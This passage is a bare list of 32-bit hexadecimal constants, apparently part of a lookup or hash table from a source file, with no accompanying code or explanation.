0x83D3D331, 0x99CDE331, 0x2C1D6C31, 0xC307D531, 0x61815F31, 0xD10E4E31, 0xA5999031, 0x7018BE31, 0xAA7F1131, 0x45514731, 0x4E03F632, 0x52C68832, 0xE8BFF632, 0xF1E84832, 0xE9FCFB32, 0xCE569932, 0x8C227332, 0x9729EE32, 0x8F4BC32, 0x8836E732, 0x85C7E232, 0xCB0D8932, 0xE0FC6A32, 0x22B9F132, 0x6E37F132, 0x1B509C32, 0x23BE6432, 0xC6384D32, 0x81E1AD32, 0x92593632, 0x6283BE32, 0xEE6ABD32, 0x8052F533, 0xF49C1533, 0x7685B333, 0x591EA833, 0xE3802533, 0x6F009E33, 0x3B882533, 0x4F3E0633, 0xC666CF33, 0x45619B33, 0x5F2DE833, 0xC755733, 0x35785333, 0x9B069233, 0xF0AED233, 0xEF72F533, 0xE991F733, 0xD8D77733, 0xF91B8C33, 0xD130D34, 0x24D84334, 0x5F9DF634, 0x403CD434, 0x4B770634, 0x926B8734, 0xCCBF0334, 0x51367B34, 0x8570DD34, 0xA4E69134, 0x2867A834, 0x966934, 0xC8055034, 0xA56EE34, 0x3821A334, 0xCA931F34, 0x18DB5434, 0xABF77334, 0xA38C0234, 0x1B17E334, 0xD77CC34, 0xDCC5B934, 0x3764D734, 0xE1E0ED34, 0x94119534, 0x1E6EC434, 0x8D9A1734, 0x5BBCC934, 0xB01A5434, 0x92F50134, 0xC1A11435, 0xC3A12135, 0x39C0B635, 0x10BD4435, 0x99D90735, 0x768CBB35, 0x94BF0D35, 0x66DA9935, 0xE3261B35, 0x54763B35, 0xC515E735, 0x80BAA035, 0x2E0DFA35, 0x79D7D235, 0x20317535, 0xBCE03D35, 0x1F3B035, 0xBF7F9035, 0x33457535, 0x4221E435, 0x6E67FD35, 0x761E635, 0xF3076135, 0x336F3D35, 0xA6E73135, 0xAC494E35, 0xFE485135, 0xE8C8E535, 0x9A17F835, 0x408A9436, 0x213C6D36, 0xB25D9536, 0xFAA3D236, 0xF29C0B36, 0xAF83036, 0xBD91B136, 0xDF7CBD36, 0x10B6AB36, 0x431AA036, 0x58BEA436, 0x4FCA6436, 0x8DE13B36, 0x21F5B36, 0x141CC936, 0xD130F636, 0x49829236, 0xE39DAF36, 0x9B431236, 0x347B4436, 0x5666A837, 0x7B2A0337, 0xA17FBF37, 0xEC024237, 0xF7612A37, 0x1418CA37, 0x47B0C137, 0x49C4B137, 0xD6844637, 0x9D854A37, 0x54998C37, 0x7BD26837, 0x8BAAC437, 0x5A36BC37, 0x29CB3537, 0xEDD01937, 0x8D5C7B37, 0x62BFDB37, 0x27305D37, 0xB1FF7137, 0xD87AF337, 0x51E7A037, 0x86913D37, 0x11D09737, 0x99968B37, 0xA81F3638, 0x9559BB38, 0x3F75CC38, 0x1C65B038, 0x70689638, 0x50F89338, 0x1AC97138, 0xDF939A38, 0xF07DDA38, 0x9D5D9B38, 0x12077738, 0xB06CCD38, 0xA869A238, 0x96F74838, 0xB775838, 0x6CD58238, 0x97886238, 0x8DD5B838, 0x608F7D39, 0xB02C2F39, 0xEC86DF39, 0xF4E4C439, 0x7EFBA039, 0x2CBAA739, 0x23D70C39, 0x6DAABB39, 0x8376D939, 0x5F86AA39, 0xD9660339, 0xCBDB7739, 0x8FAC739, 0xA3421E39, 0x772DA539, 0x1C5CCC3A, 0xE9183D3A, 0x20AB933A, 0xABCF043A, 0x759EF63A, 0xE9BD733A, 0x8C0B243A, 0xF261633A, 0xC765633A, 0x450AD03A, 0xF8E5F73A, 0x9ACB213A, 0xD63CF33A, 0x72E8CD3A, 0xD12A643A, 0x16693C3A, 0x258CBA3A, 0x5AEFEC3A, 0xF8D7AF3B, 0xC1F6443B, 0x81BD8D3B, 0x2B83F43B, 0xF91DF93B, 0xC195803B, 0x3F8E893B, 0x2349373B, 0x528B973B, 0x6D58F73B, 0x3FD49D3B, 0x7715C03B, 0xFD4B5B3B, 0x721B763B, 0x96FD173B, 0x7AB5523B, 0xAEC9163B, 0xC6C3C53B, 0x53C9563C, 0xF79FFF3C, 0x75FC6C3C, 0x2FB9F53C, 0x5E6763C, 0x1D56993C, 0x56737A3C, 0x2C0DFE3C, 0xA6E7ED3C, 0x3B15D33C, 0x74D6B13C, 0x98F0F3C, 0x63320F3C, 0x7BC5BF3C, 0x354F283C, 0x4B37333C, 0xEFEED13C, 0xC76E023C, 0xC2DEBA3D, 0xBB54AA3D, 0xECC76C3D, 0x8B5E3E3D, 0xC69CF43D, 0x8DA93C3D, 0xC937FF3D, 0x51E1E33D, 0x58FEFC3D, 0xAC4EF23D, 0xA41BC13D, 0x6FC0353D, 0x4B44A83D, 0x62C19A3D, 0x1DE2A63D, 0xF07D603D, 0x64C0273D, 0xC06B763D, 0x7AF0133D, 0x1EBB6F3D, 0xBC0F153D, 0x755A2B3E, 0x949FE53E, 0x2F98823E, 0x71D0CF3E, 0xD63FCB3E, 0xBDC8F63E, 0x74E8C53E, 0x9B88E3E, 0xEE4D173E, 0xB386713E, 0xBA57E53E, 0x71E9C63E, 0x7C27343E, 0x3E35563E, 0x20D6273E, 0xABA6923E, 0x1C6FE43E, 0xD240123E, 0x9BF8A73F, 0x36FB8B3F, 0x9AA2BA3F, 0x727AA63F, 0x66EC713F, 0x9374523F, 0x5B912C3F, 0x3914463F, 0x1E34953F, 0x2DAD93F, 0xA316D13F, 0x39E3CB3F, 0x2A83083F, 0xD7303F, 0xE4328E3F, 0x40C4763F, 0xF3A7293F, 0x6E660D3F, 0x3CC4EB3F, 0x9B00DF3F, 0xBE27AA3F, 0xEBB003F, 0x7FF553F, 0x7A97283F, 0xB5DE340, 0x46BC5B40, 0x74EF9C40, 0xAA8BD440, 0xBEB98840, 0x73098D40, 0xA9DFDC40, 0xE66A0B40, 0x50296140, 0xAD334B40, 0x779F6E40, 0xD3F40140, 0x80A52040, 0x5CA74040, 0x82EF240, 0x6FE1E440, 0x616D5040, 0xA08C9141, 0xB3BBD241, 0x662A2F41, 0x83943F41, 0xC8EFCB41, 0xF3538041, 0x511CE741, 0xD8B90941, 0x9BF33E41, 0xE9E46941, 0x29D3841, 0x30ADE541, 0x507F3241, 0xE6D85741, 0xBB3C5A41, 0x489FDD41, 0xAB933841, 0xC4BC4841, 0xD0567D41, 0x67E74842, 0x9320E642, 0x36610842, 0xA0E9B42, 0xB7B7D442, 0x70912E42, 0x1F63B042, 0xB49C1442, 0x3930C042, 0x1259DF42, 0x9365E042, 0xE4BD5342, 0xA4049042, 0xB9827942, 0x5E3B5942, 0x5D2FC042, 0x50A95442, 0x4C71D143, 0x90C74343, 0x1F321943, 0xA0777943, 0x50A62C43, 0x46F21343, 0x84F05943, 0x95481343, 0x4FFEFE43, 0x8434CB43, 0x2D23D743, 0x81DF8B43, 0x7820CA43, 0x79543043, 0x40E80543, 0x55E06443, 0x9CC80A43, 0xA6203643, 0x7B2F0743, 0x286BF543, 0xE70D1F43, 0xCA52CF43, 0x5A949543, 0xB1460D43, 0x9E8F1644, 0x60B6E744, 0x35BCA844, 0x451A2644, 0xAE7FF044, 0xBB619744, 0x11EC7844, 0xB998D444, 0xC44C2F44, 0x1D244044, 0x56D5B144, 0x5E832444, 0x32A93544, 0x43709044, 0xD8EB3A44, 0x457F1E44, 0xAE446344, 0x98D244, 0x500D9244, 0x458F4F45, 0x7E082045, 0xC871E745, 0x5332E645, 0xF6659045, 0x30572945, 0x8F266745, 0x879AE45, 0xF5CA2A45, 0x2BEE1F45, 0x59090745, 0xDC0FC145, 0x7722F545, 0xE29EE145, 0x1DEBCB45, 0xD1EEBC45, 0x672EFB45, 0xB0E56045, 0xABBE1E45, 0x961E1745, 0x7CEFFA45, 0x6EE1E946, 0x8F7D9F46, 0x1B4046, 0xBA672146, 0x2C2B0C46, 0xD26CCA46, 0x4111BA46, 0x492C9E46, 0xA8A0D246, 0x47531446, 0x3A68AA46, 0x9ACC6446, 0xCF358946, 0x8BAC4146, 0xFC5A4946, 0xA65FF946, 0x334EFD46, 0x348B9046, 0x8B635546, 0xFB301746, 0xC4977B47, 0x5FDC1047, 0xC0E3AA47, 0x5E854D47, 0xFC2DCF47, 0xFA7F5047, 0xF867F747, 0x40D73747, 0x1DC50247, 0xFB0CA947, 0xDF83DB47, 0x1D530E47, 0x2009E747, 0x5A2A47, 0x3301EA47, 0x1118A947, 0x3C30B447, 0xB986FF47, 0xDDFB6448, 0x51B2D848, 0x208DD848, 0xBDBB5948, 0xD1ED1D48, 0x6C767148, 0x43BB7E48, 0xD003E648, 0x408F7148, 0x8524A848, 0x633F8C48, 0xCE8B8748, 0x64BA4648, 0xB6094948, 0xF62B3C48, 0x23441648, 0x761F8F48, 0x81D64248, 0x85725848, 0x3B51B348, 0xCA7A0A49, 0x85488C49, 0xBC649C49, 0x40BB1149, 0x99B8B49, 0xD9BF6549, 0xD265B049, 0xBB7CCE49, 0xC4AEAF49, 0xA0D8C749, 0xB7CD0A49, 0xD680D49, 0x52A1CA49, 0x1EF20849, 0x9F019C49, 0x9BDC0B49, 0x934BE749, 0x7652DD49, 0x9F47049, 0xB998CB49, 0x46CB3A49, 0x3B216749, 0xE2089749, 0xF4A1A14A, 0x5A59A24A, 0x469A2B4A, 0xF81E884A, 0xD036DA4A, 0xAB7A4A, 0xEFCF554A, 0xDFE34E4A, 0x4CAD1A4A, 0x280A004A, 0xEA01BD4A, 0x4B865C4A, 0x6FC4924A, 0x8F291C4A, 0xCBA99F4A, 0xF4FBF14A, 0x9219D44A, 0xEFD2564A, 0x2D833F4A, 0x9B38374A, 0xE933B34A, 0xB054EC4B, 0xCEEAD94B, 0x1CFBFD4B, 0xB7A0914B, 0xCF3EFA4B, 0xBD088F4B, 0x1F950E4B, 0x513D444B, 0x3C44E4B, 0x703F524B, 0x67510C4B, 0xA7C8594B, 0x30D72A4B, 0x1A40454B, 0x2314444B, 0xA6438D4B, 0x7D593B4C, 0xCEA55F4C, 0x9262744C, 0x1F375B4C, 0x83CE1A4C, 0x7DCD644C, 0x77AC1B4C, 0x90DF7A4C, 0xB2FB5C4C, 0x9D84554C, 0x804F444C, 0x3EA9D44C, 0xF67BB44C, 0x6096504C, 0x1C0C5E4C, 0xE87CBE4C, 0xF2A65A4C, 0xF840134C, 0xF2630A4C, 0x5AC9F04D, 0x7963FA4D, 0x7ABD94D, 0xC273BB4D, 0x57F56A4D, 0xE0FF064D, 0xBBA8D34D, 0x1B09714D, 0xCBE9A54D, 0xE08C834D, 0x54077C4D, 0x96DAA4D, 0xA706E84D, 0xF3504F4D, 0x17F4F44D, 0x881A694D, 0x542FEB4D, 0xF440C04D, 0x9226734D, 0xADF9904D, 0xDFC35E4D, 0x239C1D4E, 0x3ADA414E, 0x48D02A4E, 0x7A72A24E, 0x53DAEF4E, 0xB8DF604E, 0x68A054E, 0x23C5274E, 0x8218944E, 0xC86C1B4E, 0xB8689B4E, 0xFFFE754E, 0xB5AD044E, 0xF120A34E, 0xD3CCF64E, 0x8DE8E24E, 0xFD569E4E, 0x501D7B4E, 0x7740EA4E, 0xDD31EC4E, 0x46828B4E, 0x24A1284E, 0x2EA4B54E, 0x8C73E64F, 0xA7E7E04F, 0xE8D524F, 0x797CAE4F, 0xF65F0F4F, 0xB3A2CC4F, 0x3FBE904F, 0x51E0064F, 0xE9AE494F, 0xA58BBF4F, 0xD3D5D74F, 0xC3BC1B4F, 0xA2CAAB4F, 0x1B09184F, 0xE0F0684F, 0x741BF04F, 0x511E6F50, 0xE1EF6450, 0x4B707F50, 0xF3C01350, 0xF5659E50, 0xFBD9B050, 0x9FDCB250, 0x4BD59750, 0xDCA96950, 0x494A9E50, 0xFBBAC350, 0x807B3450, 0x8BBF2950, 0x77340650, 0xE206C450, 0xBF855650, 0x5133A750, 0x10DE5150, 0xBBFC9050, 0x9CD6A451, 0x1CFB3F51, 0x2AD2EC51, 0xF4187E51, 0xC87B6A51, 0xD8260751, 0x3BF93651, 0xF8EC5751, 0x9879AC51, 0x5D67F751, 0x41FA0E51, 0x60118951, 0xB710A51, 0xD2753551, 0xF48F3051, 0x533C0651, 0xA635F451, 0xD56C3D52, 0x84374452, 0xDABDCB52, 0xA3CDF152, 0x4181752, 0x814D0752, 0xD1D2FD52, 0x2E80DB52, 0x3242F952, 0x7F9B9052, 0xE05E7052, 0xB8359952, 0x57592D52, 0x3CA16652, 0xC6517D52, 0x83CB5052, 0xB0B2C852, 0xB5977853, 0xB739F53, 0x30B51753, 0x46826B53, 0x14F52453, 0xE76A2353, 0x57F24253, 0x40062C53, 0xF3F1D953, 0x3507D253, 0xABD19253, 0xB395D753, 0x81802053, 0x728D3D53, 0x922A6653, 0xED366E53, 0x572BA553, 0x61CAE253, 0x28A45454, 0xCDC9D654, 0xB731DF54, 0x38CA2954, 0x76876154, 0x6AA9A154, 0x3624F054, 0x89EA7B54, 0x9413EB54, 0x774A4C54, 0x34219154, 0x60EB4054, 0xA198DB54, 0x829ED654, 0x819CD954, 0x1AB3B954, 0x6F60AB54, 0x30822554, 0xDD6A1E54, 0x5E8E6F54, 0xDF6D5D54, 0x7A877554, 0x79B43255, 0x46D18755, 0xEEFC8A55, 0x5C065D55, 0x4A962D55, 0x80E3DA55, 0xCF198055, 0xE3438955, 0x35A0B955, 0xF4999A55, 0xCCCA6855, 0x7B786555, 0x3AC9CB55, 0x5AD7DC55, 0xF48A9155, 0x86FDDF55, 0xCCB41A55, 0xAD40AD55, 0x230D5455, 0xC0157255, 0x6739AD55, 0x99379D55, 0x44253855, 0x22E9F555, 0xEEBDFE55, 0x90950455, 0x8F6C1F55, 0xBA4CAA56, 0xB1808F56, 0x56485B56, 0x56253356, 0x7349C856, 0x2952BA56, 0x8A444056, 0x4677C656, 0xEDA68956, 0x47EDEE56, 0xC21C8A56, 0x6F463F56, 0xFF1BC556, 0x20609E56, 0x400F9556, 0x9DA21956, 0x7E0D6056, 0x6CB24B56, 0x6AE0AD56, 0xB4F0AD56, 0x8306C256, 0x353E8056, 0x9A5C1D56, 0x96663D56, 0x65C16D57, 0x22DAE257, 0xDEECBC57, 0x7AB77B57, 0x3383F57, 0xA7DC5657, 0x37877757, 0xFCBD557, 0xBDD9FA57, 0xA6F2C057, 0x2A50657, 0x2B520A57, 0x4E937D57, 0xA90EC257, 0x90D6EE57, 0xE7529357, 0x79275A57, 0x6B0E9D57, 0xFE272A57, 0x3E47F357, 0x93045157, 0x78E1A557, 0x20E01957, 0x6396058, 0x59352658, 0x3BD3F458, 0xF11FC458, 0xBA9AD458, 0xA9DC8558, 0x48DA6A58, 0x5C4C8458, 0xBC5A9C58, 0x919A4858, 0xDB0A7A58, 0xAE84D758, 0xB8132158, 0xB4A9A558, 0xE8D11C58, 0x3AFF9E58, 0xD6A3B458, 0x10AF5258, 0xBF987F58, 0x77182D58, 0xA08D8C58, 0xDBF75E58, 0x9CEA7458, 0xE8522D58, 0x63022C58, 0x86A0B759, 0x5E8A7559, 0x6909BA59, 0xEF8C3959, 0x67305E59, 0x7AD87059, 0x7B44D659, 0x1C340359, 0x7F8AE259, 0x4ABD1E59, 0x2F0CE859, 0x63959059, 0x584E9C59, 0xE65F8059, 0xDE1DBB59, 0x8818A959, 0xA97C2059, 0xA40EF65A, 0xC49E005A, 0xD4B9715A, 0xC1C0855A, 0xF3C2875A, 0xE190E45A, 0xE51B4C5A, 0xE3880F5A, 0x6B96145A, 0x7F70C15A, 0x2BE9235A, 0xF633805A, 0xDEB3F5A, 0x1226765A, 0x75B06B5A, 0x1479E85A, 0x2D33F15A, 0x1317125A, 0x6C73E45A, 0x648E685A, 0x4E6D875B, 0x4FD83F5B, 0xC9DDA85B, 0x51030E5B, 0x6B97075B, 0x236F525B, 0xC52F295B, 0x5D0FE25B, 0x1128A45B, 0x4B5F15B, 0x8DDD0B5B, 0xFB40075B, 0xD245455B, 0x4DAAD55B, 0x6E502A5B, 0xD99E275B, 0xBA6C085B, 0x9FA9175B, 0x3330175B, 0xBDF45B, 0x4051115B, 0xE5E8E5C, 0x70A2845C, 0x8E101F5C, 0xD437615C, 0xD268255C, 0x9F98FA5C, 0x9627905C, 0x74D4995C, 0x3B74095C, 0xFEA9B85C, 0x455DDF5C, 0x6C25975C, 0xBFFE8B5C, 0x10F6085C, 0x642D065C, 0xA712FF5C, 0x7E84C45C, 0x2F7AA05C, 0xC9CC1C5C, 0xEEB8BF5C, 0x483715C, 0x46B5A15C, 0xDF99925C, 0xD45D605C, 0xD4F7B05C, 0x1BE9D65C, 0x2EF8435C, 0xE5B5745C, 0xACBED05C, 0x506BB35C, 0x574EE85C, 0xDDE7C65C, 0xE41E45C, 0xDB3FEB5C, 0x34165B5D, 0x8251485D, 0x5ECF955D, 0xA14CC95D, 0x3DA7AA5D, 0xDB67785D, 0xFCE995D, 0xD4F845D, 0xD12E5B5D, 0x617DC75D, 0xE4938B5D, 0xBF55025D, 0xAFABFB5D, 0x87125F5D, 0xA6073B5D, 0x4BB5605D, 0xECE8365D, 0x5B1E995D, 0x8D15BE5D, 0x5C57B85D, 0x563B635D, 0xE812925D, 0x7159CB5D, 0x6F80965D, 0x65D4A35D, 0x47B3C35E, 0xDE5C995E, 0x572EB5E, 0x908A335E, 0x1E7DA95E, 0x2D817A5E, 0x4BC4105E, 0xAD13375E, 0x953EF45E, 0x5062875E, 0xE7C3405E, 0x56CB715E, 0xC915285E, 0xA877FF5E, 0x1A17A85E, 0xE97A4F5E, 0x7116785E, 0x7B36E35E, 0x5C67725E, 0xA8DB435E, 0x9FE8FD5E, 0xDF38165E, 0xD320CE5E, 0xF698765E, 0x51ADCC5F, 0x54058F5F, 0x58D9775F, 0x96A8E05F, 0x85B7725F, 0x6F5D215F, 0x1A66945F, 0x762E5C5F, 0x4C9B035F, 0xD1E5565F, 0x14AC675F, 0xE391F55F, 0x3B8E2D5F, 0x9854485F, 0x8188935F, 0xA993915F, 0x4DDF845F, 0x3D26105F, 0xCE48F260, 0xAE4F4560, 0x35A8AE60, 0xC33ED360, 0x21F51560, 0xA3525D60, 0x14680A60, 0x36EAD960, 0x6A0BEA60, 0xFC9AD060, 0x6B34A160, 0xECD12E60, 0xE52EB560, 0x9803AF60, 0xD7EC8760, 0x19808560, 0x572DD360, 0xF2EFE660, 0x6ECAE560, 0x68CDFA60, 0x96863460, 0x590A8160, 0xF7ADC960, 0x9BE7C860, 0x9C720B61, 0x6A036061, 0xBBB6DF61, 0x18867C61, 0x3F52E561, 0x589A2661, 0xA23A1D61, 0x25A9A261, 0x68BFDD61, 0x15D40761, 0xC960E161, 0x62619061, 0x13EB5861, 0x38F82261, 0xAC8A5461, 0x250ADA61, 0xED88FC61, 0x1D196361, 0x1862A461, 0xD06FF62, 0x7AF85862, 0xF7952E62, 0xE645E162, 0xC41DDA62, 0x70A0ED62, 0x3F277B62, 0xA41C3B62, 0xDB2D0762, 0x96374262, 0xED1D1662, 0xC3B02362, 0x1D094562, 0x58AFBE63, 0x31F19263, 0x62EF0A63, 0xBDCDD163, 0x823ECA63, 0xAC2C7C63, 0x2C649263, 0x9337863, 0xDD76B263, 0xAE396263, 0x6381B963, 0x9F4AF763, 0x35087963, 0x876D5363, 0x56E0C163, 0x47C60963, 0x9B9B7163, 0x5C645F64, 0xA2A73564, 0x6641A864, 0xC2169164, 0x334B9364, 0xD9622D64, 0xA6C7864, 0x7C8D6464, 0x1F938864, 0xBFC4F64, 0xB19B2764, 0x5049A864, 0x40DBF464, 0x2BC93264, 0x7DBC0764, 0xF5CCF164, 0x9EF0BC64, 0x383EC364, 0x688DE64, 0x14FE9264, 0xFD15C065, 0xD1CBC65, 0xE5F76765, 0x61ECC465, 0xF26C5D65, 0xE4547765, 0x65D84665, 0x6FE5D865, 0xDA931D65, 0x58612465, 0x6349065, 0x36A4AC65, 0x1D007E65, 0x9462665, 0x67555C66, 0x7E9EAB66, 0xA8A21766, 0xC5E08B66, 0x1D3C1466, 0xBB4E2F66, 0xDFC25D66, 0x726FAE66, 0x25CDDB66, 0x8D515E66, 0xCE8C9066, 0xA01E0E66, 0xCC1D8F66, 0xCFF6FF66, 0x1683FE66, 0xDCADEB66, 0x625C7B66, 0xE26B2666, 0x96C26F66, 0x271A9766, 0x96A07066, 0xA9CCEF66, 0x94B82066, 0xB7374A66, 0xD6CC4766, 0xB4629D66, 0x866D1B67, 0x27EE0D67, 0x4A124267, 0x310E9B67, 0x5E219B67, 0xB262DE67, 0x454C7B67, 0x40202867, 0x4C1B8867, 0x3C37C767, 0xBEAF8F67, 0x4D210467, 0x618B5F67, 0x88AE9667, 0x5A5E3B67, 0xFD6E0D67, 0xE1168767, 0x91833867, 0x895E1D67, 0xABE98267, 0x39245667, 0x1A464167, 0xD96DEC68, 0x8AF7F568, 0x94850968, 0x5E14DF68, 0x97287D68, 0x7C6F7668, 0xA07B6368, 0x49EAE968, 0x17A64668, 0xD26CAC68, 0x98713C68, 0xC9F00E68, 0x7FB25568, 0x89D28068, 0xE81FAC68, 0xD6280468, 0x15B24768, 0x55294368, 0xC59D4268, 0xCFA20D68, 0xCB716F68, 0xA0466A69, 0x2AE35169, 0x43271F69, 0xAE37E969, 0xDC520069, 0x19B17769, 0x44E1C269, 0x68C9AF69, 0x3AC90869, 0x2CD26D69, 0x74337969, 0x43220969, 0xCBEC9369, 0x30B98369, 0xF210BE69, 0xBDD3CE69, 0x4C2C6B6A, 0xE1F86C6A, 0x48914F6A, 0xE4B3726A, 0xCABD136A, 0x48039D6A, 0x5EB00A6A, 0x1977C56A, 0xD98F656A, 0x70ED476A, 0xC692F86A, 0x9773F36A, 0x3EE71F6A, 0x52873C6A, 0x4A01B76A, 0x9F3C5D6A, 0xF127AD6A, 0xFBF5536A, 0x83B7E06A, 0x4F41DF6B, 0xC14C9B6B, 0x3ACE6D6B, 0xDF084A6B, 0x1B54FB6B, 0xCC95C96B, 0xA42EFA6B, 0xD6343F6B, 0x56345F6B, 0xD7624E6B, 0xB97A966B, 0x629F866B, 0x4EFE7E6B, 0x20AB0B6B, 0x3CE5BF6B, 0xB98DB96B, 0xFE0A106B, 0xD9783F6B, 0x346B506C, 0x2B757E6C, 0xB241806C, 0xD762D16C, 0x4AC39C6C, 0x6F5F1E6C, 0xD50DF46C, 0x10DD636C, 0xA69AE16C, 0xC552E06C, 0xA97C2F6C, 0xFEA40B6C, 0xE0104D6C, 0x18D07C6C, 0x4F5546C, 0x5DEEC76C, 0x8230FF6C, 0x4FFB8C6C, 0x16FD386C, 0xD78AC46C, 0xAA39FD6C, 0xB552626C, 0x8AEA886C, 0x789D8C6C, 0x9F9E856C, 0x76DAC96C, 0x183A66C, 0x4626756C, 0xFFD7476C, 0xA89336C, 0xF9B6426D, 0xB72F086D, 0x97420B6D, 0x2465296D, 0xA9419B6D, 0x1D82766D, 0x4F37276D, 0x520FCB6D, 0xD43BB56D, 0x3E1E286D, 0x2CFB0E6D, 0xB70D7C6D, 0x9A176B6E, 0xDED82A6E, 0x91534C6E, 0x7E24BD6E, 0x8C8A8D6E, 0xF686B26E, 0xB4F44C6E, 0x554BA16E, 0xC207D6E, 0xF637166E, 0xF0996C6E, 0x1193ED6E, 0x95E1546E, 0x29046E, 0x6F203C6E, 0x8F60366E, 0x1F91A06E, 0x7D65EB6E, 0x39A3CC6F, 0x83B6046F, 0xF11F956F, 0xAED95A6F, 0x2798F56F, 0x3F0D1A6F, 0xF8FC196F, 0x7CFAE36F, 0x7EF8316F, 0x45268B6F, 0x7DBCEF6F, 0x9D6376F, 0x3536946F, 0xB3CEC06F, 0x6C47A6F, 0xC2385B6F, 0xF30C566F, 0x509A286F, 0x269B006F, 0xCB8FD96F, 0xC24B4F6F, 0xCE87DA6F, 0x7605EF6F, 0xB930956F, 0x7B4C3E6F, 0x9955BC6F, 0x5C95B670, 0x40520E70, 0x8029970, 0xEE8D9E70, 0x99EE4570, 0x837BD370, 0xF2865370, 0x187B9070, 0x1D2B5C70, 0x968E5770, 0xA6F02670, 0x382BE070, 0x81F34C71, 0xD3850671, 0x19F0C471, 0x87C5D271, 0x60F72371, 0xDB8B5D71, 0xB802B671, 0x679CE71, 0x95DB71, 0xA81B5B71, 0x8B2DE971, 0x389EF71, 0x7BF61471, 0xC0E23671, 0x9194DB71, 0xF9FB4B71, 0x29F97A71, 0x94AE7172, 0x8876C872, 0x5298F472, 0x5E72AB72, 0x13B4F72, 0x5FEFAB72, 0xBBB26172, 0xB3200F72, 0xCD31C872, 0x9E8D8B72, 0xC1FFB672, 0xBFABD872, 0x7BED1872, 0x55A21772, 0x1D83872, 0x9F49C72, 0xA27F4472, 0xCFB37773, 0x4062FF73, 0x720B8073, 0x1CBC1373, 0xDF552973, 0x3FB40673, 0xF7134E73, 0x5A74E873, 0x128C3873, 0x72FF2E73, 0x78350773, 0x2F0D0973, 0x4256C73, 0x30463D73, 0x25EB5873, 0x75324674, 0x725C6174, 0x81FFB874, 0x52FB8074, 0xA592EC74, 0x40C84A74, 0xEB4CBA74, 0x3F712874, 0x2E458F74, 0xFBDBE374, 0xEDAC574, 0x75C49F74, 0xACDD0674, 0x87A0C174, 0x98F3B274, 0x829E975, 0x3BB12B75, 0x7EB8F275, 0xC8CC9E75, 0xB2E83B75, 0x16E53875, 0x139C0875, 0xA717A875, 0x9E741875, 0x54E9EE75, 0x59060F75, 0xABF02075, 0x84BDD475, 0xB1172075, 0xD75CDD75, 0xE103475, 0xC6C04C75, 0x7D4BC475, 0xEDC31475, 0x97353375, 0x142C8F76, 0xD91D9576, 0xAEC0D176, 0x32B7A076, 0x249BC876, 0xFFED3676, 0x4B643076, 0x1D766976, 0x1D99F676, 0xF4038776, 0xD3B04476, 0x909A1D76, 0x60DE1B76, 0xAB1FDD76, 0x1E2E3177, 0x17E6777, 0x6B931477, 0xAE040377, 0xC1625277, 0x41924877, 0xBECD77, 0xDD2BFC77, 0x358D1D77, 0x11378777, 0xB9B7E777, 0x71AEFD77, 0xBF85AE77, 0xF3240B77, 0xC81C4677, 0xCAD2EF77, 0xE9DAF877, 0x62B43677, 0x4B58F177, 0x8DD49B77, 0xEAF67377, 0xD2161E77, 0xDFA36277, 0x5777EC77, 0x9CB8D278, 0xF6015178, 0x8E1D8F78, 0x5C350D78, 0xECE81278, 0xF4287778, 0x468CC978, 0x8F7AF78, 0x7A569F78, 0x92DAFA78, 0x5656D578, 0x584C5178, 0xD9281778, 0x60E29B78, 0xD33AFF79, 0x8243B79, 0xB30F779, 0x9BCD2979, 0xD5FFE779, 0x74C16879, 0xC7A3D279, 0x9B266079, 0xDD79D679, 0x233DE879, 0x1D980479, 0x73C6F979, 0xDDF5C579, 0x9388CF79, 0xD41DF479, 0x4487F579, 0x7500C79, 0x177EFC79, 0xC12AC47A, 0xF50BC67A, 0xE84A127A, 0x41A7267A, 0x112D637A, 0xF1B8817A, 0xD04A817A, 0x546C627A, 0x34D91E7A, 0x324FA47A, 0x3767C7A, 0x19297A7A, 0x3551727A, 0xF63D817A, 0x832DEB7A, 0x68E36B7A, 0x6942DB7A, 0x7524E27B, 0xC71E607B, 0x65C597B, 0xDBFB067B, 0x16AED87B, 0x1A65037B, 0xAAC9317B, 0x89EEE07B, 0xFFE2667B, 0x96C0277B, 0x4F217E7B, 0x36BE807B, 0x8770017B, 0x1789437B, 0xCF29097B, 0xE48D757B, 0x1BC28B7B, 0xEF6FF47B, 0x5E4DF47B, 0x52ACCB7B, 0x79CA237B, 0xADF2267C, 0x3B13797C, 0x88068C7C, 0x515AF67C, 0xA0F7F07C, 0x5C9F477C, 0xF736227C, 0xEAB6417C, 0x57B8DA7C, 0xD864E17C, 0x94BCAC7C, 0x9E2F917C, 0xFEEA107C, 0x1126E37C, 0x20C6217C, 0x3CD4307C, 0xD8B7637C, 0xFC942D7C, 0xAE99C57C, 0x139FD37D, 0x7017257D, 0x58F1DF7D, 0xE96CFE7D, 0xF9D7D67D, 0x8DCFE77D, 0x90700C7D, 0x8D7E3A7D, 0xAB11267D, 0x6ACE1B7D, 0x4FFF397D, 0xA07C5B7D, 0xD4F5D07D, 0x7CC8057D, 0xC589CD7D, 0x9754C27D, 0x70AA5B7D, 0x64DDB07D, 0x79E1D27D, 0x86C9497D, 0xCC3CF97D, 0xDE86447D, 0xAB77DA7D, 0x59A3A17D, 0xE9BF2A7D, 0x6A3F747D, 0x54E75C7D, 0x7BF4A7D, 0x9199C77D, 0x6BA48C7E, 0x99C927E, 0xF4B80C7E, 0x5B6A607E, 0xEB3C4C7E, 0x51BBCE7E, 0xA25D767E, 0xC1EC907E, 0x7D58ED7E, 0xA565E27E, 0xCDB4FB7E, 0x9A083B7E, 0xBCEFB87E, 0xE905BC7E, 0xD217EE7E, 0xCAECF37E, 0xE0C9307E, 0x8F75657E, 0x547417F, 0x28D54A7F, 0xB3D9A67F, 0x8011247F, 0x47978D7F, 0x9F82917F, 0xE13C1F7F, 0xCA1167F, 0x9F3D577F, 0x2133977F, 0xD461CA7F, 0xAD234B7F, 0x62F5987F, 0x8BE3D47F, 0xC317717F, 0xB6E1917F, 0x3CB1D17F, 0x3BE1257F, 0x99CB167F, 0x6435F67F, 0x47187F7F, 0xE15D777F, 0x42BD0780, 0x345C2980, 0x273C6180, 0x781C7E80, 0x18B17C80, 0x9A388380, 0xCC068380, 0x6345EC80, 0x486C1280, 0xEA469980, 0xCDC52280, 0x637BB680, 0xA57E2E80, 0x3F0A3680, 0x849CEB80, 0xD70ECC80, 0x5CC1380, 0xB89DBB80, 0x8D8B180, 0xFC13CE80, 0x12677780, 0x5C85FF81, 0xEA235081, 0xEE443481, 0x3461981, 0xF8053081, 0x6ED3AD81, 0xAF769B81, 0x3A8AB081, 0xC9018181, 0x932FDB81, 0xE15A5281, 0xD23E381, 0x3457D681, 0x837F8581, 0xE010F081, 0x2508AC81, 0xD1AE2681, 0x4C684C81, 